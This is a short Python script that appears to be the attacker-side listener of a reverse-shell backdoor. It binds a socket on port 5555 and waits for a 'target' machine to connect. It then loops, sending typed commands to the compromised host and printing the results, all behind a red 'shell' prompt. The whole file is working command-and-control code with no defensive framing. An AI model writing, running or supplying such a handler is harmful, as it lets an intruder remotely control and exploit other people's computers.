import socket
from termcolor import colored
import json

def reliable_recv():
    data = ''
    while True:
        try: 
            data = data + target.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def reliable_send(data):
    jsondata = json.dumps(data)
    target.send(jsondata.encode())

def target_communication():
    while True:
        command = input(colored(f'* shell~{ip}: ', 'red'))
        reliable_send(command)
        if command == 'exit':
            break
        result = reliable_recv()
        print(result)

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind(('127.0.0.1', 5555))
print(colored('[+] listening for connections', 'blue'))
sock.listen(5)
target, ip = sock.accept()
print(colored(f'[+] target connected from {str(ip)}', 'green'))

target_communication()